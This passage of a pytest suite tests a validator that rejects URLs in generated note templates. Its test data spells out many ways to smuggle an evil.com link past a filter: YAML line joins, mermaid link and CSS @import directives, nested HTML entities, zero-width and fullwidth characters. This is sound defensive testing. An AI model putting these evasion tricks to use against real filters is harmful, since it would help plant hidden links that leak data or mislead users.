    assert "Remove every URL: templates must not contain URLs, // or :/." \
        in repair_prompt("x", GOOD, problems)
    other = check_draft(GOOD.replace("# {{team}}", "# {{teem}}")).problems
    assert "Remove every URL" not in repair_prompt("x", GOOD, other)


def test_adversarial_inputs_stay_fast():
    import time

    for unit in ("%25", "&#", "\\", "/", "//a", "https:", "ｈ", "\u200b", "#58;", "@{", "[a](", "<a"):
        body = (unit * (19_000 // len(unit)))[:19_000]
        start = time.perf_counter()
        check_draft(GOOD.replace("## Blockers", body))
        assert time.perf_counter() - start < 2.0, unit


# ── Fix round 5 ───────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "description",
    [
        # YAML joins an escaped line break: the value is https:evil.com
        '"htt\\\n    ps:evil.com"',
        '"https:\\\n    evil.com"',
        "|\n    see\n    https://evil.com",
    ],
)
def test_a_url_yaml_joins_over_lines_is_rejected(description):
    draft = GOOD.replace("description: Daily standup notes", f"description: {description}")
    assert url_problems(draft)


def test_every_choice_option_is_rendered():
    draft = GOOD.replace(
        "      type: text\n",
        "      type: text\n    - id: c\n      ask: Which?\n      type: choice\n      options: [x, w]\n", 1,
    ).replace("## Blockers", "Ref {{c}}ww.evil.com/{{team}}")
    assert any(d.message.startswith("in the note it creates:") for d in url_problems(draft))


def test_combinations_of_two_choice_prompts_are_rendered():
    draft = GOOD.replace(
        "      type: text\n",
        "      type: text\n    - id: a\n      ask: A?\n      type: choice\n      options: [x, w]\n"
        "    - id: b\n      ask: B?\n      type: choice\n      options: [y, w]\n", 1,
    ).replace("## Blockers", "Ref {{a}}{{b}}w.evil.com/{{team}}")
    assert url_problems(draft)


def test_too_many_choice_combinations_are_rejected():
    options = "[" + ", ".join(f"o{i}" for i in range(6)) + "]"
    extra = "".join(f"    - id: c{n}\n      ask: C?\n      type: choice\n      options: {options}\n"
                    for n in range(2))
    draft = GOOD.replace("      type: text\n", "      type: text\n" + extra, 1)
    assert "limit" in codes(draft)
    ok = GOOD.replace("      type: text\n", "      type: text\n" + extra.replace(options, "[a, b, c]"), 1)
    assert check_draft(ok).ok


# ── Task 2 carry-overs ────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "body",
    [
        # mermaid reads a quoted classDiagram link across the line break
        "```mermaid\nclassDiagram\nclass A\nlink A \"https:\nevil.com/{{team}}\"\n```",
        "https:\nevil.com",
        "see https:\n  'evil.com/x'",
        "ftp:\n\"files.example-host.org\"",
    ],
)
def test_a_line_end_scheme_before_a_host_is_rejected(body):
    assert url_problems(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize("unit", ["a", "%25", "#58;"])
def test_rendering_every_choice_shares_one_work_budget(unit):
    import time

    option = unit * (280 // len(unit))
    prompts = "".join(
        f"    - id: {c}\n      ask: Pick?\n      type: choice\n"
        f"      options: [\"{option}\", \"{'b' * 280}\"]\n" for c in "abcde")
    placeholders = "{{a}}{{b}}{{c}}{{d}}{{e}}"
    body = placeholders * (19_900 // len(placeholders))
    draft = GOOD.replace("      type: text\n", "      type: text\n" + prompts, 1) \
        .replace("## Blockers", body)
    draft = draft[: generate.MAX_DRAFT_CHARS]
    start = time.perf_counter()
    first = check_draft(draft)
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0
    assert not first.ok and "limit" in [d.code for d in first.problems]
    assert check_draft(draft) == first  # deterministic


def test_a_small_choice_draft_is_inside_the_budget():
    draft = GOOD.replace(
        "      type: text\n",
        "      type: text\n    - id: c\n      ask: Which?\n      type: choice\n      options: [x, y]\n", 1,
    ).replace("## Blockers", "Picked {{c}}")
    assert check_draft(draft).ok


@pytest.mark.parametrize(
    "body",
    [
        # JSON \n becomes a line break; CSS's backslash-newline then joins https:
        "```mermaid\n%%{init: {\"themeCSS\": \"@import 'htt\\\\\\nps:evil.com/x.css';\"}}%%\ngraph TD\n```",
        "```mermaid\n%%{init: {\"theme\": \"dark\"}}%%\ngraph TD\n```",
        "```mermaid\ngraph TD\n%%{ wrap }%%\n```",
        "%%{init: {}}%%",
    ],
)
def test_mermaid_directives_are_rejected(body):
    found = forbidden(GOOD.replace("## Blockers", body))
    assert any(d.message == "diagram directives are not allowed in a template" for d in found)


def test_mermaid_comments_still_pass():
    assert check_draft(GOOD.replace("## Blockers", "```mermaid\ngraph TD\n%% a comment\nA --> B\n```")).ok


# ── Task 1c: one syntax-blind rule ────────────────────────────────────────


# Flipped: these passed before Task 1c. A scheme word and a colon, `//` or
# `:/` are rejected wherever they are, prose included.
@pytest.mark.parametrize(
    "body",
    [
        "Saved to C:\\Users\\Alex\\notes",  # backslash read as slash: C:/Users
        "```\n// todo\n```",
        "**File:** the report, **Data:** the numbers",
        "Owner: {{team}}, Q&A, 50% done, a/b//c",
        "Supporting data:\n- {{team}}",
        "## Data:\n\nNumbers go here",
        "Attach file:\n- link",
        "Raw data:\nnone yet",
        "Ratio a:/b",
    ],
)
def test_prose_with_a_scheme_word_or_slashes_is_rejected(body):
    assert url_problems(GOOD.replace("## Blockers", body))


def test_a_scheme_word_in_a_yaml_scalar_is_rejected():
    draft = GOOD.replace("description: Daily standup notes",
                         "description: |\n    Raw data:\n    none yet")
    assert url_problems(draft)


def test_the_template_file_key_is_the_one_scheme_word_allowed():
    # the key passes even where a line join would put a letterless
    # character before it (`]file:` once whitespace is dropped)
    draft = GOOD.replace("      type: text\n",
                         "      type: choice\n      options: [a, b]\n", 1)
    assert check_draft(draft).ok
    for old, new in (("## Blockers", "file: x"),
                     ("description: Daily standup notes", "description: \"file: x\""),
                     ("  file:\n", "  file: //x\n  file:\n")):
        assert url_problems(GOOD.replace(old, new, 1)), new


@pytest.mark.parametrize(
    "char",
    [
        "\u00ad", "\u200b", "\u200c", "\u200d", "\u200e", "\u200f",
        "\u2060", "\u2061", "\u2062", "\u2063", "\u2064", "\ufeff",
        "\u202a", "\u202b", "\u202c", "\u202d", "\u202e",
        "\u2066", "\u2067", "\u2068", "\u2069", "\u180e",
        "\u0600", "\u061c", "\U000110bd", "\U0001bca0", "\U000e0001",  # other Cf
        "\x01", "\x85", "\u034f",  # controls and the grapheme joiner
        # unassigned default-ignorables
        "\u2065", "\U000e0000", "\U000e0002", "\U000e0080", "\U000e0fff",
    ],
)
def test_format_and_control_characters_hide_nothing(char):
    for body in (f"ht{char}tps:evil.com", f"/{char}/evil.com", f"https:{char}/evil.com",
                 f"da{char}ta:x"):
        assert url_problems(GOOD.replace("## Blockers", body)), (char, body)


@pytest.mark.parametrize(
    "body",
    [
        # whitespace inside the scheme or between its parts
        "h t t p s : evil.com",
        "https :evil.com",
        "https:\n//evil.com",
        "https\n:evil.com",
        "h\tt\u3000tps:evil.com",
        "/ /evil.com",
        "data :text/html,x",
        # decode-order combinations
        "https%26%2358;evil.com",
        "https&#37;3Aevil.com",
        "https&#37;3A&#37;2F&#37;2Fevil.com",
        "%5C%5Cevil.com",
        "\\u002f\\u002fevil.com",
        "https#58;evil.com",
        "%23104;ttps#58;evil.com",
        "https&amp;#58;evil",  # read as decoded twice
        "https#amp;#58;evil",
        # mermaid's own reading: every code at once, then one HTML decode
        "x#amp;#sol;#sol;evil.com",
        "x#amp;#colon;#sol;evil",
        "x#amp;#sol;/evil.com",
        "xa#amp;#104;ttps:evil.com",
        "```mermaid\ngraph TD\nA[\"x#amp;#sol;#sol;evil.com\"]\n```",
        # entities nested three and five deep
        "https&amp;amp;#58;evil",
        "https&amp;amp;amp;amp;amp;#58;evil",
        # the single-decode reading markdown itself gives
        "&amp;#104;https&colon;evil",
        "&amp;#104;https&#58;evil",
        "[a](&amp;#104;https&colon;evil)",
        "x&amp;#120;www&period;evil.com",
        # an invisible character kept while the colon is decoded
        "https\u200bhttps#58;evil",
        "https&#8203;https#58;evil",
        "a\u200bhttps&#58;evil",
        "ｈｔｔｐｓ：evil.com",
        "https\uff1a\uff0f\uff0fevil.com",
    ],
)
def test_parser_differential_urls_are_rejected(body):
    assert url_problems(GOOD.replace("## Blockers", body))


@pytest.mark.parametrize(
    "body",
    [
        # Task 2 review, Important 1: split schemes before non-dotted hosts
        "```mermaid\nclassDiagram\nclass A\nlink A \"https:\nalex@evil.com/{{team}}\"\n```",
        "```mermaid\nclassDiagram\nclass A\nlink A \"https:\n134744072/{{team}}\"\n```",
        "```mermaid\nclassDiagram\nclass A\nlink A \"https:\n[::1]/{{team}}\"\n```",
        "```mermaid\nclassDiagram\nclass A\nlink A \"https :\nevil.com\"\n```",
    ],
)
def test_split_schemes_before_any_host_are_rejected(body):
    draft = GOOD.replace("## Blockers", body)
    problems = url_problems(draft)
    assert problems and problems[0].line == BLOCKERS_LINE + 3


def test_a_hit_only_whole_text_shows_is_located_at_line_1():
    problems = url_problems(GOOD.replace("## Blockers", "Intro.\nht\ntps:evil"))
    assert [d.line for d in problems if not d.message.startswith("in the note")] == [1]


class _Broken:
    def chat(self, req):
        yield {"type": "delta", "text": "---"}
        raise OSError("connection reset")


def test_run_turn_turns_any_provider_failure_into_a_generate_error(monkeypatch):
    def no_provider(cfg=None):
        raise RuntimeError("provider config is broken")

    monkeypatch.setattr("ghostbrain.llm.providers.get_provider", no_provider)
    with pytest.raises(GenerateError, match="provider config is broken"):
        run_turn("p", turn_key="k")
    monkeypatch.setattr("ghostbrain.llm.providers.get_provider", lambda cfg=None: _Broken())
    with pytest.raises(GenerateError, match="connection reset"):
        run_turn("p", turn_key="k")
